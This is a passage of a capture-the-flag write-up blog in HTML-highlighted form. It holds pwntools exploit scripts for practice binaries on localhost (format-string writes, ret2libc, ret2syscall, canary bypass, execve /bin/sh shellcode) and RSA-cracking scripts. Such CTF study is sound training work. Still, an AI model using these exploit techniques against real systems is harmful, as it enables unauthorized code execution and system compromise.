class="hljs-number">9</span><br>p.sendline(<span class="hljs-string">&quot;9&quot;</span>)        #<span class="hljs-number">10</span><br>p.sendline(<span class="hljs-string">&quot;8&quot;</span>)            #<span class="hljs-number">11</span><br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)            #<span class="hljs-number">12</span><br>p.sendline(<span class="hljs-string">&quot;0&quot;</span>)            #<span class="hljs-number">13</span><br><br>p.recvuntil(<span class="hljs-string">&quot;address is:&quot;</span>)<br>leak = int(p.recvline()[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>],<span class="hljs-number">16</span>)<br># gdb.attach(p)<br>payload = b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span>+p64(pop_rdi)+p64(leak)+p64(<span class="hljs-number">0x401296</span>)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="changeable-shellcode"><a href="#changeable-shellcode" class="headerlink" title="changeable_shellcode"></a>changeable_shellcode</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"># coding=utf-<span class="hljs-number">8</span><br>from pwn import *<br><br>from ctypes import *<br><br># context<span class="hljs-number">.</span>log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context<span class="hljs-number">.</span>arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-number">34369</span>)<br># p = process(<span class="hljs-string">&#x27;./shellcode&#x27;</span>)<br><br><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span>[<span class="hljs-built_in">rax</span>+<span class="hljs-number">33</span>], <span class="hljs-number">5</span><br><span class="hljs-keyword">push</span> <span class="hljs-number">0</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0x68732f2f6e69622f</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">rsp</span><br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rdx</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">59</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>p<span class="hljs-number">.</span>sendline(asm(shellcode)+b<span class="hljs-string">&#x27;\x0f&#x27;</span>)<br><br>p<span class="hljs-number">.</span>interactive()<br></code></pre></td></tr></table></figure><h3 id="format-level2"><a href="#format-level2" class="headerlink" title="format_level2"></a>format_level2</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># coding=utf-8</span><br>from pwn import *<br><br>from ctypes import *<br><br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br><span class="hljs-comment"># context.arch = &quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-number">40621</span>)<br><span class="hljs-comment"># p = process(&#x27;./format_level2&#x27;)</span><br><br>p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,b<span class="hljs-string">&quot;3&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,b<span class="hljs-string">&quot;%p&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>stack = <span class="hljs-keyword">int</span>(p.recvline()[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>func_ret = stack + <span class="hljs-number">64</span><br>p.sendline(b<span class="hljs-string">&quot;3&quot;</span>)<br>payload = b<span class="hljs-string">&quot;%23p%10$hhn&quot;</span>.ljust(<span class="hljs-number">12</span>, b<span class="hljs-string">&#x27;a&#x27;</span>) + p32(func_ret)<br>p.send(payload)<br>p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,b<span class="hljs-string">&quot;3&quot;</span>)<br>payload = b<span class="hljs-string">&quot;%147p%10$hhn&quot;</span>.ljust(<span class="hljs-number">12</span>, b<span class="hljs-string">&#x27;a&#x27;</span>) + p32(func_ret+<span class="hljs-number">1</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,payload)<br>p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,b<span class="hljs-string">&quot;4&quot;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="feedback"><a href="#feedback" class="headerlink" title="feedback"></a>feedback</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs clean"># coding=utf<span class="hljs-number">-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br># context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">42147</span>)<br># p = process(<span class="hljs-string">&#x27;./feedback&#x27;</span>)<br><br>p.sendlineafter(<span class="hljs-string">&quot;Which list do you want to write?&quot;</span>,b<span class="hljs-string">&quot;-8&quot;</span>)<br>payload = p64(<span class="hljs-number">0xFBAD1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + b<span class="hljs-string">&#x27;\x00&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;.\n&quot;</span>,payload)<br><br>p.recvuntil(b<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">8</span>)) - <span class="hljs-number">0x1ec980</span><br>success(hex(libc_base))<br>flag = libc_base + <span class="hljs-number">0x1f1700</span><br><br>p.sendlineafter(<span class="hljs-string">&quot;?&quot;</span>,b<span class="hljs-string">&quot;-11&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;.&quot;</span>,b<span class="hljs-string">&#x27;\x68&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;?&quot;</span>,b<span class="hljs-string">&quot;-11&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;.&quot;</span>,p64(flag))<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="format-level3"><a href="#format-level3" class="headerlink" title="format_level3"></a>format_level3</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># coding=utf<span class="hljs-number">-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br># context.log_level = &quot;debug&quot;<br># context.arch = &quot;amd64&quot;<br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-number">42835</span>)<br># p = process(<span class="hljs-string">&#x27;./format_level3&#x27;</span>)<br><br>p.sendlineafter(&quot;:&quot;,b&quot;3&quot;)<br>p.sendlineafter(&quot;:&quot;,b&quot;%6$p&quot;)<br>p.recvuntil(&quot;0x&quot;)<br>stack = <span class="hljs-type">int</span>(p.recvline()[:<span class="hljs-number">-1</span>], <span class="hljs-number">16</span>)<br>func_ret = stack + <span class="hljs-number">4</span><br><br>p.sendlineafter(&quot;:&quot;,b&quot;3&quot;)<br>payload = &quot;%&#123;&#125;p%6$hhn&quot;.format(func_ret &amp; <span class="hljs-number">0xff</span>)<br>p.sendlineafter(&quot;:&quot;,payload.encode())<br>p.sendlineafter(&quot;:&quot;,b&quot;3&quot;)<br>payload = &quot;%&#123;&#125;p%14$hn&quot;.format(<span class="hljs-number">0x9317</span>)<br>p.sendlineafter(&quot;:&quot;,payload.encode())<br>p.sendlineafter(&quot;:&quot;,b&quot;4&quot;)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs makefile">from pwn import *<br>from LibcSearcher import*<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(&#x27;localhost&#x27;, 38193)<br><span class="hljs-comment">#p = process(&#x27;./pwn(1)&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc6_2.7-10ubuntu3_amd64.so&quot;)</span><br><br>pop_rdi = 0x000000000040117e<br>main = 0x4011E8<br><br>p1 = b<span class="hljs-string">&quot;a&quot;</span> * (0x50 + 0x8)<br>p1 += p64(pop_rdi) + p64(elf.got[&#x27;puts&#x27;])<br>p1 += p64(elf.plt[&#x27;puts&#x27;])<br>p1 += p64(main)<br>p.sendline(p1)<br><br>puts_addr = u64(p.recvuntil(b<span class="hljs-string">&quot;\x7f&quot;</span>)[-6:].ljust(8, b<span class="hljs-string">&quot;\x00&quot;</span>))<br><span class="hljs-section">success(&quot;puts:%s&quot;,hex(puts_addr))</span><br><br>libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)<br>libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)<br>system_addr = libc_base + libc.dump(&#x27;system&#x27;)<br>bin_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)<br><br>p2 = b<span class="hljs-string">&quot;a&quot;</span> * (0x50 + 0x8)<br>one = [0x50a37, 0xebcf1, 0xebcf5, 0xebcf8]<br><span class="hljs-comment"># p2 += p64(libc_base + one[3])</span><br>p2 += p64(pop_rdi) + p64(bin_addr) + p64(0x40122A)<br>p2 += p64(system_addr)<br>p.sendline(p2)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># coding=utf-8</span><br>from pwn import *<br><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(&#x27;localhost&#x27;, 40953)<br><span class="hljs-comment"># p = process(&#x27;./ret2syscall&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./ret2syscall&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc6_2.35-0ubuntu3_amd64.so&quot;</span>)<br><br>pop_rax = 0x000000000040117e<br>pop_rdi = 0x0000000000401180<br>pop_rsi_rdx = 0x0000000000401182<br>bss = 0x0000000000404060<br>ret = 0x00000000004011C1<br>syscall_addr = 0x401185<br>binsh_addr = 0x0000000000404040<br><br>payload = b<span class="hljs-string">&quot;a&quot;</span> * 0x48<br>payload += p64(pop_rdi) + p64(binsh_addr)  <span class="hljs-comment"># stackoverflow &amp; rdi=binsh_addr</span><br>payload += p64(pop_rsi_rdx) + p64(0) + p64(0)  <span class="hljs-comment"># rsi=0 rdx=0</span><br>payload += p64(pop_rax) + p64(59)  <span class="hljs-comment"># rax=59 </span><br>payload += p64(syscall_addr)  <span class="hljs-comment"># execve(&quot;/bin/sh&quot;,0,0)</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="shellcode-level2"><a href="#shellcode-level2" class="headerlink" title="shellcode_level2"></a>shellcode_level2</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">41523</span>)<br># p = process(<span class="hljs-string">&#x27;./shellcode_level2&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./shellcode_level2&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc6_2.35-0ubuntu3_amd64.so&quot;</span>)<br><br>payload = b<span class="hljs-string">&#x27;\x00&#x27;</span>+asm(shellcraft.sh()) <br># gdb.attach(p)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="little-canary"><a href="#little-canary" class="headerlink" title="little_canary"></a>little_canary</h3><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs erlang"># coding=utf-<span class="hljs-number">8</span><br>from pwn import *<br>from LibcSearcher import *  <br>from ctypes import *<br><br># context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br># context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(&#x27;localhost&#x27;, <span class="hljs-number">40905</span>)<br># p = process(&#x27;./little_canary&#x27;)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br># libc = ELF(<span class="hljs-string">&quot;./libc-2.32-1.fc33.x86_64.so&quot;</span>)<br><br>main = <span class="hljs-number">0</span>x4012BA<br>pop_rdi = <span class="hljs-number">0</span>x0000000000401343<br><br>p.sendlineafter(b<span class="hljs-string">&quot;name?\n&quot;</span>,b<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">72</span>)<br>p.recvuntil(b<span class="hljs-string">&quot;\n&quot;</span>)<br>canary = u64(b<span class="hljs-string">&quot;\x00&quot;</span>+p.recv(<span class="hljs-number">7</span>))<br># gdb.attach(p)<br><span class="hljs-function"><span class="hljs-title">success</span><span class="hljs-params">(hex(canary))</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(hex(elf.got[&#x27;puts&#x27;]))</span></span><br><span class="hljs-function"><span class="hljs-title">payload</span> = <span class="hljs-title">b&#x27;a&#x27;</span>*72+<span class="hljs-title">p64</span><span class="hljs-params">(canary)</span>+<span class="hljs-title">p64</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">payload</span> += <span class="hljs-title">p64</span><span class="hljs-params">(pop_rdi)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(elf.got[&#x27;puts&#x27;])</span></span><br><span class="hljs-function"><span class="hljs-title">payload</span> += <span class="hljs-title">p64</span><span class="hljs-params">(elf.plt[&#x27;puts&#x27;])</span></span><br><span class="hljs-function"><span class="hljs-title">payload</span> += <span class="hljs-title">p64</span><span class="hljs-params">(main)</span></span><br><span class="hljs-function"><span class="hljs-title">p</span>.<span class="hljs-title">sendline</span><span class="hljs-params">(payload)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">leak</span> = <span class="hljs-title">u64</span><span class="hljs-params">(p.recvuntil(b<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, b<span class="hljs-string">&quot;\x00&quot;</span>))</span></span><br><span class="hljs-function"><span class="hljs-title">leak</span> = <span class="hljs-title">u64</span><span class="hljs-params">(p.recvuntil(b<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, b<span class="hljs-string">&quot;\x00&quot;</span>))</span></span><br><span class="hljs-function"><span class="hljs-title">libc</span> = L<span class="hljs-title">ibcSearcher</span><span class="hljs-params">(&#x27;puts&#x27;,leak)</span>  </span><br><span class="hljs-function"><span class="hljs-title">libc_base</span> = <span class="hljs-title">leak</span> - <span class="hljs-title">libc</span>.<span class="hljs-title">dump</span><span class="hljs-params">(&#x27;puts&#x27;)</span></span><br><span class="hljs-function"><span class="hljs-title">success</span><span class="hljs-params">(hex(libc_base))</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">p</span>.<span class="hljs-title">sendline</span><span class="hljs-params">(b<span class="hljs-string">&quot;payload&quot;</span>)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">payload</span> = <span class="hljs-title">b&#x27;a&#x27;</span>*72+<span class="hljs-title">p64</span><span class="hljs-params">(canary)</span>+<span class="hljs-title">p64</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">payload</span> += <span class="hljs-title">p64</span><span class="hljs-params">(pop_rdi)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(libc_base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>))</span>+<span class="hljs-title">p64</span><span class="hljs-params">(<span class="hljs-number">0</span>x4012DC)</span></span><br><span class="hljs-function"><span class="hljs-title">payload</span> += <span class="hljs-title">p64</span><span class="hljs-params">(libc_base + libc.dump(&#x27;system&#x27;))</span></span><br><span class="hljs-function"><span class="hljs-title">p</span>.<span class="hljs-title">sendline</span><span class="hljs-params">(payload)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">p</span>.<span class="hljs-title">interactive</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure><h3 id="shellcode-level3"><a href="#shellcode-level3" class="headerlink" title="shellcode_level3"></a>shellcode_level3</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs clean"># coding=utf<span class="hljs-number">-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *  <br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br># context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">34733</span>)<br>elf = ELF(<span class="hljs-string">&quot;./shellcode_level3&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc6_2.35-0ubuntu3_amd64.so&quot;</span>)<br><br><br>p.sendline(b<span class="hljs-string">&quot;\xE9\x48\xD1\xFF\xFF&quot;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h3 id="baby-e"><a href="#baby-e" class="headerlink" title="baby_e"></a>baby_e</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> gmpy2<br><br>n = <span class="hljs-number">553409369582823237678532685244026647155180191225879439432235077135813123637186465008813830373646133388592395760175777499266561095087891764348044063111935877931069321764391883899483374576303169645488542398590564148654412004383012178107972880058460460806768779452529433458826925606225797078653905380530651390617109384086518728626571028089036812787671647095695947167204428442727185744172445701874820612799168887428075695751162763647868386879374037826876671079326544820609721731078985096813307183878793033824330869698508952853770794414757655681370862323768018291030331209143189638496644361618184164228294031490537429556439588954274708598530042700988138862000054458742762198052079867259365645914383561162796796952346445529346145323567650621600171442575319262718389389870407629339714751583360252884338116164466349449862781112019462555743429653595045695696967783338371470032332852204294900011651434678829104876529439166176589508898757122660322523937330848536715937381297551894198974459004139082562228022412335520195652419375915216074658463954339332593244483927157329404652516225481116614815221154229491846087288087715884363786672244655901308480290011237244562251084095684531716327141154558809471185132979704992609461470501119328696999713829</span><br>e = <span class="hljs-number">7</span><br>c = <span class="hljs-number">147693154873835354725007152781732424355869776162377337823960431913672366269917723916891506269449726723757821517328874729037838600793748824028829185409932536014732765063216715033843955453706710187792772702199448156372644163429786386035008302836467605094954587157232829525150652611067567669525072625329634860065850520051628272535479197120008981979404760445193750864902244921407742155742716289495581989134730376783828846663464819337418977287363028738701414486788851136608957124505485242331701209645216580641917007780811842757125048746184068597664780265422321550909392419865169775282217442331295071069272774722564587602419768461231775480847018941840911357926330143045826277813722919121117172763493242590521245640828462665947672485094793188432098216701511715232654611338293295459889814699850788048985878279440740712956248569068077253790198036918598519191892836075254345518967666166925163908185663991353344555402397055977817370082929420443034626201745027965444069777059760865359310439815816749939498993014457995041394803598825093836045546578310632172636478575946653375857640993393714607308326474003446154152048840071034349831168612740218034679021240949747357214453636633636662650940968576792518622437627529244515229173</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">n, e, c</span>):<br>    k = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        m1 = k * n + c<br>        m, t = gmpy2.iroot(m1, e)<br>        <span class="hljs-keyword">if</span> t:<br>            <span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br>            <span class="hljs-keyword">break</span><br>        k += <span class="hljs-number">1</span><br>exp(n, e, c)<br></code></pre></td></tr></table></figure><h3 id="bad-E"><a href="#bad-E" class="headerlink" title="bad_E"></a>bad_E</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br> <br>e = <span class="hljs-number">65537</span><br>p = <span class="hljs-number">11727544912613560398705401423145382428897876620077115390278679983274961030035884083100580422155496261311510530671232666801444557695190734596546855494472819</span><br>q = <span class="hljs-number">6853495238262155391975011057929314523706159020478084061020122347902601182448091015650787022962180599741651597328364289413042032923330906135304995252477571</span><br>c = <span class="hljs-number">63388263723813143290256836284084914544524440253054612802424934400854921660916379284754467427040180660945667733359330988361620691457570947823206385692232584893511398038141442606303536260023122774682805630913037113541880875125504376791939861734613177272270414287306054553288162010873808058776206524782351475805</span><br>n = p*q<br> <br>phi_n = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(GCD(e,q-<span class="hljs-number">1</span>))<br>d = gmpy2.invert(e,(p-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c,d,p)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h3 id="n-amp-n"><a href="#n-amp-n" class="headerlink" title="n&amp;n"></a>n&amp;n</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> gmpy2<br><br>n= <span class="hljs-number">13612969130810965900902742090064423006385890357159609755971027204203418808937093492927060428980020085273603754747223030702684866992231913349067578014240319426522039068836171388168087260774376277346092066880984406890296520951318296354893551565670293486797637522297989653182109744864444697818991039473180752980752117041574628063002176339235126861152739066489620021077091941250365101779354009854706729448088217051728432010328667839532327286559570597994183126402340332924370812383312664419874352306052467284992411543921858024469098268800500500651896608097346389396273293747664441553194179933758992070398387066135330851531</span><br>e1= <span class="hljs-number">0x114514</span><br>e2= <span class="hljs-number">19198101</span><br>c1= <span class="hljs-number">5776799746376051463605370130675046329799612910435315968508603116759552095183027263116443417343895252766060748671845650457077393391989018107887540639775168897954484319381180406512474784571389477212123123540984850033695748142755414954158933345476509573211496722528388574841686164433315356667366007165419697987147258498693175698918104120849579763098045116744389310549687579302444264316133642674648294049526615350011916160649448726069001139749604430982881450187865197137222762758538645387391379108182515717949428258503254717940765994927802512049427407583200118969062778415073135339774546277230281966880715506688898978925</span><br>c2= <span 